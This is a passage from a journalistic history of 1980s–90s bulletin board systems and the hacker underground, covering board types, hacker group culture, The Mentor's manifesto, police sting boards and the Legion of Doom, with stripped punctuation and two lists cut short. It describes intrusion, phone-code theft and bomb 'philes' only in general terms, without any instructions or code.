viruses.  If there is a financial charge to use the board  increasingly common, especially in larger and fancier systems  then accounts must be kept, and users must be billed.  And if the board crashes  a very common occurrence  then repairs must be made.    Boards can be distinguished by the amount of effort spent in regulating them.  First, we have the completely open board, whose sysop is off chugging brews and watching re runs while his users generally degenerate over time into peevish anarchy and eventual silence.  Second comes the supervised board, where the sysop breaks in every once in a while to tidy up, calm brawls, issue announcements, and rid the community of dolts and troublemakers.  Third is the heavily supervised board, which sternly urges adult and responsible behavior and swiftly edits any message considered offensive, impertinent, illegal or irrelevant.  And last comes the completely edited  electronic publication,  which is presented to a silent audience which is not allowed to respond directly in any way.    Boards can also be grouped by their degree of anonymity. There is the completely anonymous board, where everyone uses pseudonyms   handles   and even the sysop is unaware of the user's true identity.  The sysop himself is likely pseudonymous on a board of this type.  Second, and rather more common, is the board where the sysop knows  or thinks he knows  the true names and addresses of all users, but the users don't know one another's names and may not know his.  Third is the board where everyone has to use real names, and roleplaying and pseudonymous posturing are forbidden.    Boards can be grouped by their immediacy.   Chat lines  are boards linking several users together over several different phone lines simultaneously, so that people exchange messages at the very moment that they type.   Many large boards feature  chat  capabilities along with other services.   Less immediate boards, perhaps with a single phoneline, store messages serially, one at a time.  And some boards are only open for business in daylight hours or on weekends, which greatly slows response.  A NETWORK of boards, such as  FidoNet,  can carry electronic mail from board to board, continent to continent, across huge distances  but at a relative snail's pace, so that a message can take several days to reach its target audience and elicit a reply.    Boards can be grouped by their degree of community.  Some boards emphasize the exchange of private, person to person electronic mail.  Others emphasize public postings and may even purge people who  lurk,  merely reading posts but refusing to openly participate.  Some boards are intimate and neighborly. Others are frosty and highly technical.  Some are little more than storage dumps for software, where users  download  and  upload  programs, but interact among themselves little if at all.    Boards can be grouped by their ease of access.  Some boards are entirely public.  Others are private and restricted only to personal friends of the sysop.  Some boards divide users by status.  On these boards, some users, especially beginners, strangers or children, will be restricted to general topics, and perhaps forbidden to post.  Favored users, though, are granted the ability to post as they please, and to stay  on line  as long as they like, even to the disadvantage of other people trying to call in.  High status users can be given access to hidden areas in the board, such as off color topics, private discussions, and or valuable software.  Favored users may even become  remote sysops  with the power to take remote control of the board through their own home computers.  Quite often  remote sysops  end up doing all the work and taking formal control of the enterprise, despite the fact that it's physically located in someone else's house.  Sometimes several  co sysops  share power.    And boards can also be grouped by size.  Massive, nationwide commercial networks, such as CompuServe, Delphi, GEnie and Prodigy, are run on mainframe computers and are generally not considered  boards,  though they share many of their characteristics, such as electronic mail, discussion topics, libraries of software, and persistent and growing problems with civil liberties issues.  Some private boards have as many as thirty phone lines and quite sophisticated hardware.  And then there are tiny boards.    Boards vary in popularity.  Some boards are huge and crowded, where users must claw their way in against a constant busy signal.  Others are huge and empty  there are few things sadder than a formerly flourishing board where no one posts any longer, and the dead conversations of vanished users lie about gathering digital dust.  Some boards are tiny and intimate, their telephone numbers intentionally kept confidential so that only a small number can log on.    And some boards are UNDERGROUND.    Boards can be mysterious entities.  The activities of their users can be hard to differentiate from conspiracy. Sometimes they ARE conspiracies.  Boards have harbored, or have been accused of harboring, all manner of fringe groups, and have abetted, or been accused of abetting, every manner of frowned  upon, sleazy, radical, and criminal activity.  There are Satanist boards.  Nazi boards.  Pornographic boards.  Pedophile boards. Drug dealing boards.  Anarchist boards.  Communist boards.  Gay and Lesbian boards  these exist in great profusion, many of them quite lively with well established histories .  Religious cult boards.  Evangelical boards.  Witchcraft boards, hippie boards, punk boards, skateboarder boards.  Boards for UFO believers. There may well be boards for serial killers, airline terrorists and professional assassins.  There is simply no way to tell. Boards spring up, flourish, and disappear in large numbers, in most every corner of the developed world.  Even apparently innocuous public boards can, and sometimes do, harbor secret areas known only to a few.  And even on the vast, public, commercial services, private mail is very private  and quite possibly criminal.    Boards cover most every topic imaginable and some that are hard to imagine.  They cover a vast spectrum of social activity.  However, all board users do have something in common  their possession of computers and phones.  Naturally, computers and phones are primary topics of conversation on almost every board.    And hackers and phone phreaks, those utter devotees of computers and phones, live by boards.  They swarm by boards. They are bred by boards.  By the late 1980s, phone phreak groups and hacker groups, united by boards, had proliferated fantastically.    As evidence, here is a list of hacker groups compiled by the editors of PHRACK on August 8, 1988.    The Administration.  Advanced Telecommunications, Inc. ALIAS.  American Tone Travelers.

WASP.    Contemplating this list is  an impressive, almost humbling business. As a cultural artifact, the thing approaches poetry.    Underground groups  subcultures  can be distinguished from independent cultures by their habit of referring constantly to the parent society.  Undergrounds by their nature constantly must maintain a membrane of differentiation.  Funny distinctive clothes and hair, specialized jargon, specialized ghettoized areas in cities, different hours of rising, working, sleeping.... The digital underground, which specializes in information, relies very heavily on language to distinguish itself.  As can be seen from this list, they make heavy use of parody and mockery.  It's revealing to see who they choose to mock.    First, large corporations.  We have the Phortune 500, The Chief Executive Officers, Bellcore, IBM Syndicate, SABRE  a computerized reservation service maintained by airlines .  The common use of  Inc.  is telling  none of these groups are actual corporations, but take clear delight in mimicking them.    Second, governments and police.  NASA Elite, NATO Association.   Feds R Us  and  Secret Service  are fine bits of fleering boldness.  OSS  the Office of Strategic Services was the forerunner of the CIA.    Third, criminals.  Using stigmatizing pejoratives as a perverse badge of honor is a time honored tactic for subcultures  punks, gangs, delinquents, mafias, pirates, bandits, racketeers.    Specialized orthography, especially the use of  ph  for  f  and  z  for the plural  s,  are instant recognition symbols. So is the use of the numeral  0  for the letter  O   computer  software orthography generally features a slash through the zero, making the distinction obvious.    Some terms are poetically descriptive of computer intrusion   the Stowaways, the Hitchhikers, the PhoneLine Phantoms, Coast to Coast.  Others are simple bravado and vainglorious puffery.   Note the insistent use of the terms  elite  and  master.    Some terms are blasphemous, some obscene, others merely cryptic  anything to puzzle, offend, confuse, and keep the straights at bay.    Many hacker groups further re encrypt their names by the use of acronyms   United Technical Underground becomes UTU, Farmers of Doom become FoD, the United SoftWareZ Force becomes, at its own insistence,  TuSwF,  and woe to the ignorant rodent who capitalizes the wrong letters.    It should be further recognized that the members of these groups are themselves pseudonymous.  If you did, in fact, run across the  PhoneLine Phantoms,  you would find them to consist of  Carrier Culprit,   The Executioner,   Black Majik,   Egyptian Lover,   Solid State,  and  Mr Icom.    Carrier Culprit  will likely be referred to by his friends as  CC,  as in,  I got these dialups from CC of PLP.     It's quite possible that this entire list refers to as few as a thousand people.  It is not a complete list of underground groups  there has never been such a list, and there never will be.  Groups rise, flourish, decline, share membership, maintain a cloud of wannabes and casual hangers on.  People pass in and out, are ostracized, get bored, are busted by police, or are cornered by telco security and presented with huge bills. Many  underground groups  are software pirates,  warez d00dz,  who might break copy protection and pirate programs, but likely wouldn't dare to intrude on a computer system.    It is hard to estimate the true population of the digital underground.  There is constant turnover.  Most hackers start young, come and go, then drop out at age 22  the age of college graduation.  And a large majority of  hackers  access pirate boards, adopt a handle, swipe software and perhaps abuse a phone  code or two, while never actually joining the elite.    Some professional informants, who make it their business to retail knowledge of the underground to paymasters in private corporate security, have estimated the hacker population at as high as fifty thousand.  This is likely highly inflated, unless one counts every single teenage software pirate and petty phone  booth thief.  My best guess is about 5,000 people.  Of these, I would guess that as few as a hundred are truly  elite   active computer intruders, skilled enough to penetrate sophisticated systems and truly to worry corporate security and law enforcement.    Another interesting speculation is whether this group is growing or not.  Young teenage hackers are often convinced that hackers exist in vast swarms and will soon dominate the cybernetic universe.  Older and wiser veterans, perhaps as wizened as 24 or 25 years old, are convinced that the glory days are long gone, that the cops have the underground's number now, and that kids these days are dirt stupid and just want to play Nintendo.    My own assessment is that computer intrusion, as a non  profit act of intellectual exploration and mastery, is in slow decline, at least in the United States  but that electronic fraud, especially telecommunication crime, is growing by leaps and bounds.    One might find a useful parallel to the digital underground in the drug underground.  There was a time, now much  obscured by historical revisionism, when Bohemians freely shared joints at concerts, and hip, small scale marijuana dealers might turn people on just for the sake of enjoying a long stoned conversation about the Doors and Allen Ginsberg.  Now drugs are increasingly verboten, except in a high stakes, highly criminal world of highly addictive drugs.  Over years of disenchantment and police harassment, a vaguely ideological, free wheeling drug underground has relinquished the business of drug dealing to a far more savage criminal hard core.  This is not a pleasant prospect to contemplate, but the analogy is fairly compelling.    What does an underground board look like   What distinguishes it from a standard board   It isn't necessarily the conversation  hackers often talk about common board topics, such as hardware, software, sex, science fiction, current events, politics, movies, personal gossip.  Underground boards can best be distinguished by their files, or  philes,  pre composed texts which teach the techniques and ethos of the underground.  These are prized reservoirs of forbidden knowledge.  Some are anonymous, but most proudly bear the handle of the  hacker  who has created them, and his group affiliation, if he has one.    Here is a partial table of contents of philes from an underground board, somewhere in the heart of middle America, circa 1991.  The descriptions are mostly self explanatory.

The damned thing is full of stuff about bombs!    What are we to make of this     First, it should be acknowledged that spreading knowledge about demolitions to teenagers is a highly and deliberately antisocial act.  It is not, however, illegal.    Second, it should be recognized that most of these philes were in fact WRITTEN by teenagers.  Most adult American males who can remember their teenage years will recognize that the notion of building a flamethrower in your garage is an incredibly neat o idea.  ACTUALLY building a flamethrower in your garage, however, is fraught with discouraging difficulty.  Stuffing gunpowder into a booby trapped flashlight, so as to blow the arm off your high  school vice principal, can be a thing of dark beauty to contemplate.  Actually committing assault by explosives will earn you the sustained attention of the federal Bureau of Alcohol, Tobacco and Firearms.    Some people, however, will actually try these plans.  A determinedly murderous American teenager can probably buy or steal a handgun far more easily than he can brew fake  napalm  in the kitchen sink.  Nevertheless, if temptation is spread before people a certain number will succumb, and a small minority will actually attempt these stunts.  A large minority of that small minority will either fail or, quite likely, maim themselves, since these  philes  have not been checked for accuracy, are not the product of professional experience, and are often highly fanciful.  But the gloating menace of these philes is not to be entirely dismissed.    Hackers may not be  serious  about bombing  if they were, we would hear far more about exploding flashlights, homemade bazookas, and gym teachers poisoned by chlorine and potassium. However, hackers are VERY serious about forbidden knowledge. They are possessed not merely by curiosity, but by a positive LUST TO KNOW.  The desire to know what others don't is scarcely new.  But the INTENSITY of this desire, as manifested by these young technophilic denizens of the Information Age, may in fact BE new, and may represent some basic shift in social values  a harbinger of what the world may come to, as society lays more and more value on the possession, assimilation and retailing of INFORMATION as a basic commodity of daily life.    There have always been young men with obsessive interests in these topics.  Never before, however, have they been able to network so extensively and easily, and to propagandize their interests with impunity to random passers by.  High school teachers will recognize that there's always one in a crowd, but when the one in a crowd escapes control by jumping into the phone lines, and becomes a hundred such kids all together on a board, then trouble is brewing visibly.  The urge of authority to DO SOMETHING, even something drastic, is hard to resist.  And in 1990, authority did something.  In fact authority did a great deal.       The process by which boards create hackers goes something like this.  A youngster becomes interested in computers  usually, computer games.  He hears from friends that  bulletin boards  exist where games can be obtained for free.   Many computer games are  freeware,  not copyrighted  invented simply for the love of it and given away to the public  some of these games are quite good.   He bugs his parents for a modem, or quite often, uses his parents' modem.     The world of boards suddenly opens up.  Computer games can be quite expensive, real budget breakers for a kid, but pirated games, stripped of copy protection, are cheap or free. They are also illegal, but it is very rare, almost unheard of, for a small scale software pirate to be prosecuted.  Once  cracked  of its copy protection, the program, being digital data, becomes infinitely reproducible.  Even the instructions to the game, any manuals that accompany it, can be reproduced as text files, or photocopied from legitimate sets.  Other users on boards can give many useful hints in game playing tactics.  And a youngster with an infinite supply of free computer games can certainly cut quite a swath among his modem less friends.    And boards are pseudonymous.  No one need know that you're fourteen years old  with a little practice at subterfuge, you can talk to adults about adult things, and be accepted and taken seriously!  You can even pretend to be a girl, or an old man, or anybody you can imagine.  If you find this kind of deception gratifying, there is ample opportunity to hone your ability on boards.    But local boards can grow stale.  And almost every board maintains a list of phone numbers to other boards, some in distant, tempting, exotic locales.  Who knows what they're up to, in Oregon or Alaska or Florida or California   It's very easy to find out  just order the modem to call through its software   nothing to this, just typing on a keyboard, the same thing you would do for most any computer game.  The machine reacts swiftly and in a few seconds you are talking to a bunch of interesting people on another seaboard.    And yet the BILLS for this trivial action can be staggering!  Just by going tippety tap with your fingers, you may have saddled your parents with four hundred bucks in long  distance charges, and gotten chewed out but good.  That hardly seems fair.    How horrifying to have made friends in another state and to be deprived of their company  and their software  just because telephone companies demand absurd amounts of money!  How painful, to be restricted to boards in one's own AREA CODE  what the heck is an  area code  anyway, and what makes it so special   A few grumbles, complaints, and innocent questions of this sort will often elicit a sympathetic reply from another board user  someone with some stolen codes to hand.  You dither a while, knowing this isn't quite right, then you make up your mind to try them anyhow  AND THEY WORD!  Suddenly you're doing something even your parents can't do.  Six months ago you were just some kid  now, you're the Crimson Flash of Area Code 512!  You're bad  you're nationwide!    Maybe you'll stop at a few abused codes.  Maybe you'll decide that boards aren't all that interesting after all, that it's wrong, not worth the risk  but maybe you won't.  The next step is to pick up your own repeat dialling program  to learn to generate your own stolen codes.   This was dead easy five years ago, much harder to get away with nowadays, but not yet impossible.   And these dialling programs are not complex or intimidating  some are as small as twenty lines of software.    Now, you too can share codes.  You can trade codes to learn other techniques.  If you're smart enough to catch on, and obsessive enough to want to bother, and ruthless enough to start seriously bending rules, then you'll get better, fast.  You start to develop a rep.  You move up to a heavier class of board  a board with a bad attitude, the kind of board that naive dopes like your classmates and your former self have never even heard of!  You pick up the jargon of phreaking and hacking from the board.  You read a few of those anarchy philes  and man, you never realized you could be a real OUTLAW without ever leaving your bedroom.    You still play other computer games, but now you have a new and bigger game.  This one will bring you a different kind of status than destroying even eight zillion lousy space invaders.    Hacking is perceived by hackers as a  game.   This is not an entirely unreasonable or sociopathic perception.  You can win or lose at hacking, succeed or fail, but it never feels  real.  It's not simply that imaginative youngsters sometimes have a hard time telling  make believe  from  real life.   Cyberspace is NOT REAL!   Real  things are physical objects like trees and shoes and cars.  Hacking takes place on a screen.  Words aren't physical, numbers  even telephone numbers and credit card numbers  aren't physical.  Sticks and stones may break my bones, but data will never hurt me.  Computers SIMULATE reality, like computer games that simulate tank battles or dogfights or spaceships.  Simulations are just make believe, and the stuff in computers is NOT REAL.    Consider this   if  hacking  is supposed to be so serious and real life and dangerous, then how come NINE YEAR OLD KIDS have computers and modems   You wouldn't give a nine year old his own car, or his own rifle, or his own chainsaw  those things are  real.     People underground are perfectly aware that the  game  is frowned upon by the powers that be.  Word gets around about busts in the underground.  Publicizing busts is one of the primary functions of pirate boards, but they also promulgate an attitude about them, and their own idiosyncratic ideas of justice.  The users of underground boards won't complain if some guy is busted for crashing systems, spreading viruses, or stealing money by wire fraud.  They may shake their heads with a sneaky grin, but they won't openly defend these practices.  But when a kid is charged with some theoretical amount of theft    233,846.14, for instance, because he sneaked into a computer and copied something, and kept it in his house on a floppy disk  this is regarded as a sign of near insanity from prosecutors, a sign that they've drastically mistaken the immaterial game of computing for their real and boring everyday world of fatcat corporate money.    It's as if big companies and their suck up lawyers think that computing belongs to them, and they can retail it with price stickers, as if it were boxes of laundry soap!  But pricing  information  is like trying to price air or price dreams.  Well, anybody on a pirate board knows that computing can be, and ought to be, FREE.  Pirate boards are little independent worlds in cyberspace, and they don't belong to anybody but the underground. Underground boards aren't  brought to you by Procter   Gamble.     To log on to an underground board can mean to experience liberation, to enter a world where, for once, money isn't everything and adults don't have all the answers.    Let's sample another vivid hacker manifesto.  Here are some excerpts from  The Conscience of a Hacker,  by  The Mentor,  from PHRACK Volume One, Issue 7, Phile 3.       I made a discovery today.  I found a computer.  Wait a second, this is cool.  It does what I want it to.  If it makes a mistake, it's because I screwed it up.  Not because it doesn't like me. ...      And then it happened... a door opened to a world... rushing through the phone line like heroin through an addict's veins, an electronic pulse is sent out, a refuge from day to day incompetencies is sought... a board is found.  'This is it... this is where I belong...'     I know everyone here... even if I've never met them, never talked to them, may never hear from them again... I know you all... ...      This is our world now.... the world of the electron and the switch, the beauty of the baud.  We make use of a service already existing without paying for what could be dirt cheap if it wasn't run by profiteering gluttons, and you call us criminals.  We explore... and you call us criminals.  We seek after knowledge... and you call us criminals.  We exist without skin color, without nationality, without religious bias... and you call us criminals.  You build atomic bombs, you wage wars, you murder, cheat and lie to us and try to make us believe that it's for our own good, yet we're the criminals.     Yes, I am a criminal.  My crime is that of curiosity. My crime is that of judging people by what they say and think, not what they look like.  My crime is that of outsmarting you, something that you will never forgive me for.          There have been underground boards almost as long as there have been boards.  One of the first was 8BBS, which became a stronghold of the West Coast phone phreak elite.  After going on line in March 1980, 8BBS sponsored  Susan Thunder,  and  Tuc,  and, most notoriously,  the Condor.    The Condor  bore the singular distinction of becoming the most vilified American phreak and hacker ever.  Angry underground associates, fed up with Condor's peevish behavior, turned him in to police, along with a heaping double helping of outrageous hacker legendry.  As a result, Condor was kept in solitary confinement for seven months, for fear that he might start World War Three by triggering missile silos from the prison payphone.   Having served his time, Condor is now walking around loose  WWIII has thus far conspicuously failed to occur.     The sysop of 8BBS was an ardent free speech enthusiast who simply felt that ANY attempt to restrict the expression of his users was unconstitutional and immoral.  Swarms of the technically curious entered 8BBS and emerged as phreaks and hackers, until, in 1982, a friendly 8BBS alumnus passed the sysop a new modem which had been purchased by credit card fraud. Police took this opportunity to seize the entire board and remove what they considered an attractive nuisance.    Plovernet was a powerful East Coast pirate board that operated in both New York and Florida.  Owned and operated by teenage hacker  Quasi Moto,  Plovernet attracted five hundred eager users in 1983.   Emmanuel Goldstein  was one time co sysop of Plovernet, along with  Lex Luthor,  founder of the  Legion of Doom  group.  Plovernet bore the signal honor of being the original home of the  Legion of Doom,  about which the reader will be hearing a great deal, soon.     Pirate 80,  or  P 80,  run by a sysop known as  Scan  Man,  got into the game very early in Charleston, and continued steadily for years.  P 80 flourished so flagrantly that even its most hardened users became nervous, and some slanderously speculated that  Scan Man  must have ties to corporate security, a charge he vigorously denied.     414 Private  was the home board for the first GROUP to attract conspicuous trouble, the teenage  414 Gang,  whose intrusions into Sloan Kettering Cancer Center and Los Alamos military computers were to be a nine days wonder in 1982.    At about this time, the first software piracy boards began to open up, trading cracked games for the Atari 800 and the Commodore C64.  Naturally these boards were heavily frequented by teenagers.  And with the 1983 release of the hacker thriller movie WAR GAMES, the scene exploded.  It seemed that every kid in America had demanded and gotten a modem for Christmas.  Most of these dabbler wannabes put their modems in the attic after a few weeks, and most of the remainder minded their P's and Q's and stayed well out of hot water.  But some stubborn and talented diehards had this hacker kid in WAR GAMES figured for a happening dude.  They simply could not rest until they had contacted the underground  or, failing that, created their own.    In the mid 80s, underground boards sprang up like digital fungi.  ShadowSpawn Elite.  Sherwood Forest I, II, and III. Digital Logic Data Service in Florida, sysoped by no less a man than  Digital Logic  himself  Lex Luthor of the Legion of Doom was prominent on this board, since it was in his area code. Lex's own board,  Legion of Doom,  started in 1984.  The Neon Knights ran a network of Apple hacker boards  Neon Knights North, South, East and West.  Free World II was run by  Major Havoc.  Lunatic Labs is still in operation as of this writing.  Dr. Ripco in Chicago, an anything goes anarchist board with an extensive and raucous history, was seized by Secret Service agents in 1990 on Sundevil day, but up again almost immediately, with new machines and scarcely diminished vigor.    The St. Louis scene was not to rank with major centers of American hacking such as New York and L.A.  But St. Louis did rejoice in possession of  Knight Lightning  and  Taran King,  two of the foremost JOURNALISTS native to the underground.  Missouri boards like Metal Shop, Metal Shop Private, Metal Shop Brewery, may not have been the heaviest boards around in terms of illicit expertise.  But they became boards where hackers could exchange social gossip and try to figure out what the heck was going on nationally  and internationally.  Gossip from Metal Shop was put into the form of news files, then assembled into a general electronic publication, PHRACK, a portmanteau title coined from  phreak  and  hack.   The PHRACK editors were as obsessively curious about other hackers as hackers were about machines.    PHRACK, being free of charge and lively reading, began to circulate throughout the underground.  As Taran King and Knight Lightning left high school for college, PHRACK began to appear on mainframe machines linked to BITNET, and, through BITNET to the  Internet,  that loose but extremely potent not for profit network where academic, governmental and corporate machines trade data through the UNIX TCP IP protocol.   The  Internet Worm  of November 2 3,1988, created by Cornell grad student Robert Morris, was to be the largest and best publicized computer intrusion scandal to date.  Morris claimed that his ingenious  worm  program was meant to harmlessly explore the Internet, but due to bad programming, the Worm replicated out of control and crashed some six thousand Internet computers.  Smaller scale and less ambitious Internet hacking was a standard for the underground elite.     Most any underground board not hopelessly lame and out  of it would feature a complete run of PHRACK  and, possibly, the lesser known standards of the underground   the LEGION OF DOOM TECHNICAL JOURNAL, the obscene and raucous CULT OF THE DEAD COW files, _P HUN_ magazine, PIRATE, the SYNDICATE REPORTS, and perhaps the highly anarcho political ACTIVIST TIMES INCORPORATED.    Possession of PHRACK on one's board was prima facie evidence of a bad attitude.  PHRACK was seemingly everywhere, aiding, abetting, and spreading the underground ethos.  And this did not escape the attention of corporate security or the police.    We now come to the touchy subject of police and boards. Police, do, in fact, own boards.  In 1989, there were police  sponsored boards in California, Colorado, Florida, Georgia, Idaho, Michigan, Missouri, Texas, and Virginia   boards such as  Crime Bytes,   Crimestoppers,   All Points  and  Bullet N  Board.   Police officers, as private computer enthusiasts, ran their own boards in Arizona, California, Colorado, Connecticut, Florida, Missouri, Maryland, New Mexico, North Carolina, Ohio, Tennessee and Texas.  Police boards have often proved helpful in community relations.  Sometimes crimes are reported on police boards.    Sometimes crimes are COMMITTED on police boards.  This has sometimes happened by accident, as naive hackers blunder onto police boards and blithely begin offering telephone codes.  Far more often, however, it occurs through the now almost traditional use of  sting boards.   The first police sting boards were established in 1985    Underground Tunnel  in Austin, Texas, whose sysop Sgt. Robert Ansley called himself  Pluto    The Phone Company  in Phoenix, Arizona, run by Ken MacLeod of the Maricopa County Sheriff's office  and Sgt. Dan Pasquale's board in Fremont, California.  Sysops posed as hackers, and swiftly garnered coteries of ardent users, who posted codes and loaded pirate software with abandon, and came to a sticky end.    Sting boards, like other boards, are cheap to operate, very cheap by the standards of undercover police operations. Once accepted by the local underground, sysops will likely be invited into other pirate boards, where they can compile more dossiers.  And when the sting is announced and the worst offenders arrested, the publicity is generally gratifying.  The resultant paranoia in the underground  perhaps more justly described as a  deterrence effect   tends to quell local lawbreaking for quite a while.    Obviously police do not have to beat the underbrush for hackers.  On the contrary, they can go trolling for them.  Those caught can be grilled.  Some become useful informants.  They can lead the way to pirate boards all across the country.    And boards all across the country showed the sticky fingerprints of PHRACK, and of that loudest and most flagrant of all underground groups, the  Legion of Doom.     The term  Legion of Doom  came from comic books.  The Legion of Doom, a conspiracy of costumed super villains headed by the chrome domed criminal ultra mastermind Lex Luthor, gave Superman a lot of four color graphic trouble for a number of decades.  Of course, Superman, that exemplar of Truth, Justice, and the American Way, always won in the long run.  This didn't matter to the hacker Doomsters   Legion of Doom  was not some thunderous and evil Satanic reference, it was not meant to be taken seriously.   Legion of Doom  came from funny books and was supposed to be funny.     Legion of Doom  did have a good mouthfilling ring to it, though.  It sounded really cool.  Other groups, such as the  Farmers of Doom,  closely allied to LoD, recognized this grandiloquent quality, and made fun of it.  There was even a hacker group called  Justice League of America,  named after Superman's club of true blue crimefighting superheros.    But they didn't last  the Legion did.    The original Legion of Doom, hanging out on Quasi Moto's Plovernet board, were phone phreaks.  They weren't much into computers.   Lex Luthor  himself  who was under eighteen when he formed the Legion  was a COSMOS expert, COSMOS being the  Central System for Mainframe Operations,  a telco internal computer network.  Lex would eventually become quite a dab hand at breaking into IBM mainframes, but although everyone liked Lex and admired his attitude, he was not considered a truly accomplished computer intruder.  Nor was he the  mastermind  of the Legion of Doom  LoD were never big on formal leadership.  As a regular on Plovernet and sysop of his  Legion of Doom BBS,  Lex was the Legion's cheerleader and recruiting officer.    Legion of Doom began on the ruins of an earlier phreak group, The Knights of Shadow.  Later, LoD was to subsume the personnel of the hacker group  Tribunal of Knowledge.   People came and went constantly in LoD  groups split up or formed offshoots.    Early on, the LoD phreaks befriended a few computer  intrusion enthusiasts, who became the associated  Legion of Hackers.   Then the two groups conflated into the  Legion of Doom Hackers,  or LoD H.  When the original  hacker  wing, Messrs.  Compu Phreak  and  Phucked Agent 04,  found other matters to occupy their time, the extra   H  slowly atrophied out of the name  but by this time the phreak wing, Messrs.  Lex Luthor,  Blue Archer,   Gary Seven,   Kerrang Khan,   Master of Impact,   Silver Spy,   The Marauder,  and  The Videosmith,  had picked up a plethora of intrusion expertise and had become a force to be reckoned with.    LoD members seemed to have an instinctive understanding that the way to real power in the underground lay through covert publicity.  LoD were flagrant.  Not only was it one of the earliest groups, but the members took pains to widely distribute their illicit knowledge.  Some LoD members, like  The Mentor,  were close to evangelical about it.  LEGION OF DOOM TECHNICAL JOURNAL began to show up on boards throughout the underground.    LOD TECHNICAL JOURNAL was named in cruel parody of the ancient and honored AT T TECHNICAL JOURNAL.  The material in these two publications was quite similar  much of it, adopted from public journals and discussions in the telco community.  And yet, the predatory attitude of LoD made even its most innocuous data seem deeply sinister  an outrage  a clear and present danger.    To see why this should be, let's consider the following  invented  paragraphs, as a kind of thought experiment.     A    W. Fred Brown, AT T Vice President for Advanced Technical Development, testified May 8 at a Washington hearing of the National Telecommunications and Information Administration  NTIA , regarding Bellcore's GARDEN project.  GARDEN  Generalized Automatic Remote Distributed Electronic Network  is a telephone  switch programming tool that makes it possible to develop new telecom services, including hold on hold and customized message transfers, from any keypad terminal, within seconds.  The GARDEN prototype combines centrex lines with a minicomputer using UNIX operating system software.      B    Crimson Flash 512 of the Centrex Mobsters reports  D00dz, you wouldn't believe this GARDEN bullshit Bellcore's just come up with!  Now you don't even need a lousy Commodore to reprogram a switch  just log on to GARDEN as a technician, and you can reprogram switches right off the keypad in any public phone booth!  You can give yourself hold on hold and customized message transfers, and best of all, the thing is run off  notoriously insecure  centrex lines using  get this  standard UNIX software!  Ha ha ha ha!     Message  A , couched in typical techno bureaucratese, appears tedious and almost unreadable.   A  scarcely seems threatening or menacing.  Message  B , on the other hand, is a dreadful thing, prima facie evidence of a dire conspiracy, definitely not the kind of thing you want your teenager reading.    The INFORMATION, however, is identical.  It is PUBLIC information, presented before the federal government in an open hearing.  It is not  secret.   It is not  proprietary.   It is not even  confidential.   On the contrary, the development of advanced software systems is a matter of great public pride to Bellcore.    However, when Bellcore publicly announces a project of this kind, it expects a certain attitude from the public   something along the lines of GOSH WOW, YOU GUYS ARE GREAT, KEEP THAT UP, WHATEVER IT IS  certainly not cruel mimickry, one  upmanship and outrageous speculations about possible security holes.    Now put yourself in the place of a policeman confronted by an outraged parent, or telco official, with a copy of Version  B .  This well meaning citizen, to his horror, has discovered a local bulletin board carrying outrageous stuff like  B , which his son is examining with a deep and unhealthy interest.  If  B  were printed in a book or magazine, you, as an American law enforcement officer, would know that it would take a hell of a lot of trouble to do anything about it  but it doesn't take technical genius to recognize that if there's a computer in your area harboring stuff like  B , there's going to be trouble.    In fact, if you ask around, any computer literate cop will tell you straight out that boards with stuff like  B  are the SOURCE of trouble.  And the WORST source of trouble on boards are the ringleaders inventing and spreading stuff like  B .  If it weren't for these jokers, there wouldn't BE any trouble.    And Legion of Doom were on boards like nobody else. Plovernet.  The Legion of Doom Board.  The Farmers of Doom Board. Metal Shop.  OSUNY.  Blottoland.  Private Sector.  Atlantis. Digital Logic.  Hell Phrozen Over.    LoD members also ran their own boards.   Silver Spy  started his own board,  Catch 22,  considered one of the heaviest around.  So did  Mentor,  with his  Phoenix Project.   When they didn't run boards themselves, they showed up on other people's boards, to brag, boast, and strut.  And where they themselves didn't go, their philes went, carrying evil knowledge and an even more evil attitude.    As early as 1986, the police were under the vague impression that EVERYONE in the underground was Legion of Doom. LoD was never that large  considerably smaller than either  Metal Communications  or  The Administration,  for instance  but LoD got tremendous press.  Especially in PHRACK, which at times read like an LoD fan magazine  and PHRACK was everywhere, especially in the offices of telco security.  You couldn't GET busted as a phone phreak, a hacker, or even a lousy codes kid or warez dood, without the cops asking if you were LoD.    This was a difficult charge to deny, as LoD never distributed membership badges or laminated ID cards.  If they had, they would likely have died out quickly, for turnover in their membership was considerable.  LoD was less a high tech street gang than an ongoing state of mind.  LoD was the Gang That Refused to Die.  By 1990, LoD had RULED for ten years, and it seemed WEIRD to police that they were continually busting people who were only sixteen years old.  All these teenage small timers were pleading the tiresome hacker litany of  just curious, no criminal intent.   Somewhere at the center of this conspiracy there had to be some serious adult masterminds, not this seemingly endless supply of myopic suburban white kids with high SATs and funny haircuts.    There was no question that most any American hacker arrested would  know  LoD.  They knew the handles of contributors to LOD TECH JOURNAL, and were likely to have learned their craft through LoD boards and LoD activism.  But they'd never met anyone from LoD.  Even some of the rotating cadre who were actually and formally  in LoD  knew one another only by board mail and pseudonyms.  This was a highly unconventional profile for a criminal conspiracy.  Computer networking, and the rapid evolution of the digital underground, made the situation very diffuse and confusing.    Furthermore, a big reputation in the digital underground did not coincide with one's willingness to commit  crimes.  Instead, reputation was based on cleverness and technical mastery.  As a result, it often seemed that the HEAVIER the hackers were, the LESS likely they were to have committed any kind of common, easily prosecutable crime.  There were some hackers who could really steal.  And there were hackers who could really hack.  But the two groups didn't seem to overlap much, if at all.  For instance, most people in the underground looked up to  Emmanuel Goldstein  of _2600_ as a hacker demigod.  But Goldstein's publishing activities were entirely legal  Goldstein just printed dodgy stuff and talked about politics, he didn't even hack.  When you came right down to it, Goldstein spent half his time complaining that computer security WASN'T STRONG ENOUGH and ought to be drastically improved across the board!    Truly heavy duty hackers, those with serious technical skills who had earned the respect of the underground, never stole money or abused credit cards.  Sometimes they might abuse phone  codes  but often, they seemed to get all the free phone time they wanted without leaving a trace of any kind.    The best hackers, the most powerful and technically accomplished, were not professional fraudsters.  They raided computers habitually, but wouldn't alter anything, or damage anything.  They didn't even steal computer equipment  most had day jobs messing with hardware, and could get all the cheap secondhand equipment they wanted.  The hottest hackers, unlike the teenage wannabes, weren't snobs about fancy or expensive hardware.  Their machines tended to be raw second hand digital hot rods full of custom add ons that they'd cobbled together out of chickenwire, memory chips and spit.  Some were adults, computer software writers and consultants by trade, and making quite good livings at it.  Some of them ACTUALLY WORKED FOR THE PHONE COMPANY  and for those, the  hackers  actually found under the skirts of Ma Bell, there would be little mercy in 1990.    It has long been an article of faith in the underground that the  best  hackers never get caught.  They're far too smart, supposedly.  They never get caught because they never boast, brag, or strut.  These demigods may read underground boards  with a condescending smile , but they never say anything there.  The  best  hackers, according to legend, are adult computer 